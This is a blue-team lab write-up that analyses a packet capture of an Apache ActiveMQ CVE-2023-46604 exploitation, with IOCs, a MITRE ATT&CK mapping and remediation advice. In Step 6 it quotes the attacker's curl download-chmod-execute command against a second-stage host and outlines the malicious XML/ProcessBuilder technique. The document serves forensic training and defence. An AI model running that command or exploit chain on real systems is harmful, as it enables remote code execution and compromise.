# CyberDefenders – OpenWire Lab

## Network Forensics | Wireshark | Apache ActiveMQ | CVE-2023-46604

**Platform:** CyberDefenders  
**Category:** Network Forensics  
**Difficulty:** Medium  
**Tool:** Wireshark  
**Focus:** Initial Access, Execution, Command and Control

---

## 1. Scenario

During a SOC investigation, a public-facing server was flagged for suspicious outbound network connections to multiple external IP addresses.

A packet capture (PCAP) was collected to investigate the suspicious activity and determine whether the server had been compromised.

The objective was to analyze the network traffic, identify the attack vector, investigate the attacker's infrastructure, and understand how the exploitation was performed.

## 2. Investigation Objectives

- Identify suspicious external IP addresses.
- Investigate the exploited service and port.
- Analyze malicious OpenWire traffic.
- Identify the XML file used to execute the exploit.
- Discover the dropped reverse shell executable.
- Identify the exploited CVE.
- Understand the vulnerability and its remediation.

## 3. Tools Used

- Wireshark
- PCAP Analysis
- Network Conversations
- Protocol Hierarchy
- TCP Stream Analysis
- HTTP Object and Request Analysis

## 4. Investigation Methodology

### Step 1 – Initial PCAP Analysis

I started by reviewing the PCAP using Wireshark.

I examined:

- Statistics → Conversations
- Statistics → Protocol Hierarchy
- IPv4 communication patterns
- TCP connections and suspicious traffic volumes

The conversations revealed three main communication pairs:

| Source IP | Destination IP | Packets |
|---|---|---:|
| 84.239.49.16 | 134.209.197.3 | 12 |
| 134.209.197.3 | 128.199.52.72 | 10 |
| 146.190.21.92 | 134.209.197.3 | 4,867 |

![IPv4 Conversations](images/01-conversations.png)

The server IP was identified as `134.209.197.3` based on its communication patterns.

One connection stood out because of its significantly higher traffic volume.

### Step 2 – Protocol Hierarchy Analysis

I reviewed the Protocol Hierarchy to identify unusual protocols.

Important observations included:

- OpenWire traffic.
- Malformed OpenWire packets.
- HTTP requests.
- XML data.
- A significant amount of TLS traffic.

![Protocol Hierarchy](images/02-protocol-hierarchy.png)

The presence of OpenWire and malformed packets led me to investigate the ActiveMQ communication further.

### Step 3 – Identifying the Initial Exploitation

I examined the OpenWire packets and identified an ExceptionResponse containing suspicious Java information.

The packet revealed:

**Java Class:**
`org.springframework.context.support.ClassPathXmlApplicationContext`

**External XML Resource:**
`http://146.190.21.92:8000/invoice.xml`

![OpenWire ExceptionResponse](images/03-exception-response.png)

Further inspection revealed an HTTP GET request for:

`/invoice.xml`

The server responded with HTTP 200 OK, indicating that the requested XML resource was successfully retrieved.

This behavior provided evidence of an exploitation attempt involving an externally hosted XML configuration file.

### Step 4 – Identifying the First C2 Server

The investigation identified:

`146.190.21.92`

This address hosted the malicious XML resource referenced in the OpenWire exception.

It was identified as the first C2 server in the lab investigation.

### Step 5 – Identifying the Exploited Service and Port

I investigated the OpenWire communication and identified the destination port:

`61616`

The vulnerable service was:

`Apache ActiveMQ`

The investigation linked the suspicious OpenWire traffic to the Apache ActiveMQ remote code execution vulnerability.

### Step 6 – Analyzing the Malicious XML

Further investigation of the XML resource revealed the Java class:

`java.lang.ProcessBuilder`

![ProcessBuilder bean in the XML](images/04-processbuilder.png)

This class was used to execute operating system commands on the compromised server.

The malicious command included downloading another payload:

`curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; /tmp/docker`

![Malicious curl command](images/05-curl-command.png)

This command:

1. Downloads a file from the second external server.
2. Saves the file as `docker`.
3. Changes its permissions to make it executable.
4. Attempts to execute the downloaded payload.

### Step 7 – Identifying the Second C2 Server

The command revealed another suspicious external IP:

`128.199.52.72`

This server hosted the second-stage payload.

### Step 8 – Identifying the Dropped Executable

The downloaded executable was named:

`docker`

Despite its name resembling a legitimate software component, it was used as a malicious payload in this attack.

### Step 9 – Identifying the Vulnerability

The exploited vulnerability was:

**CVE-2023-46604**

This vulnerability affects Apache ActiveMQ's OpenWire protocol implementation and allows remote code execution through unsafe Java class instantiation during deserialization.

![CVE-2023-46604 search result](images/06-cve-search.png)

### Step 10 – Understanding the Security Fix

The relevant validation was added to:

`BaseDataStreamMarshaller.createThrowable`

The fix ensures that only valid Throwable classes can be instantiated, preventing the exploitation technique used in this attack.

---

## 5. Indicators of Compromise (IOCs)

| Indicator | Value | Description |
|---|---|---|
| IP Address | 146.190.21.92 | First C2 server |
| IP Address | 128.199.52.72 | Second C2 server |
| IP Address | 134.209.197.3 | Compromised server |
| Port | 61616 | Apache ActiveMQ OpenWire |
| URL | http://146.190.21.92:8000/invoice.xml | Malicious XML resource |
| URL | http://128.199.52.72/docker | Second-stage payload |
| File | docker | Malicious executable |
| CVE | CVE-2023-46604 | Apache ActiveMQ RCE |

## 6. MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Exploitation of the exposed ActiveMQ service |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Execution of shell commands through bash |
| Ingress Tool Transfer | T1105 | Downloading the second-stage payload |

## 7. Incident Response Recommendations

- Isolate the compromised server.
- Block the identified malicious IP addresses.
- Investigate processes and files associated with the `docker` payload.
- Review system logs and network traffic for additional indicators.
- Patch Apache ActiveMQ to a fixed version.
- Search other systems for similar exploitation attempts.

## 8. Key Takeaways

Through this investigation, I gained practical experience in:

- Analyzing PCAP files using Wireshark.
- Investigating suspicious network conversations.
- Identifying malicious OpenWire traffic.
- Understanding Apache ActiveMQ exploitation.
- Analyzing malicious XML resources.
- Identifying C2 infrastructure and second-stage payloads.
- Mapping attacker behavior to MITRE ATT&CK.
- Understanding CVE-2023-46604 and its remediation.

## 9. Conclusion

This lab demonstrated how a vulnerability in Apache ActiveMQ can be exploited to achieve remote code execution.

By analyzing network traffic and correlating OpenWire, HTTP, and XML evidence, I was able to reconstruct the attack chain, identify the attacker's infrastructure, and understand the execution of the malicious payload.

This hands-on exercise improved my network forensics and incident investigation skills as part of my journey toward becoming a SOC Analyst.

---

**Lab:** [CyberDefenders – OpenWire](https://cyberdefenders.org/blueteam-ctf-challenges/openwire/)

**Reference:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
